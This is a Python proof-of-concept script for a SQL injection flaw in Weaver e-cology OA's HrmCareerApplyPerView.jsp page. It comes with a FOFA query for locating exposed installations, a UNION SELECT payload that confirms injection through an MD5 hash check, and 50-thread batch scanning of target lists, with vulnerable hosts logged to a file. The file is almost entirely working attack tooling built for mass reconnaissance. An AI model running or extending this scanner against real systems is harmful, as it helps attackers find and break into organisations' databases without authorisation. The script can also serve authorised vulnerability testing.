# 泛微 HrmCareerApplyPerView SQL注入漏洞
import argparse, requests, sys, time, re
from termcolor import colored
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


# fofa语句
# app="泛微-OA（e-cology）"

def banner():
    test = """
███████╗██╗    ██╗         ██████╗  █████╗       ███████╗ ██████╗ ██╗     
██╔════╝██║    ██║        ██╔═══██╗██╔══██╗      ██╔════╝██╔═══██╗██║     
█████╗  ██║ █╗ ██║        ██║   ██║███████║█████╗███████╗██║   ██║██║     
██╔══╝  ██║███╗██║        ██║   ██║██╔══██║╚════╝╚════██║██║▄▄ ██║██║     
██║     ╚███╔███╔╝███████╗╚██████╔╝██║  ██║      ███████║╚██████╔╝███████╗
╚═╝      ╚══╝╚══╝ ╚══════╝ ╚═════╝ ╚═╝  ╚═╝      ╚══════╝ ╚══▀▀═╝ ╚══════╝

"""
    colored_color = colored(test, 'blue')
    print(colored_color)


def main():
    banner()
    parser = argparse.ArgumentParser(description='泛微 HrmCareerApplyPerView SQL注入漏洞POC')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%271%27)),db_name(1),5,6,7"
    try:
        response = requests.get(url=target + api_payload, verify=False, timeout=10)
        if 'c4ca4238a0b923820dcc509a6f75849' in response.text:
            print(f"[+]{target} 存在sql注入漏洞")
            with open('result.txt', 'a') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()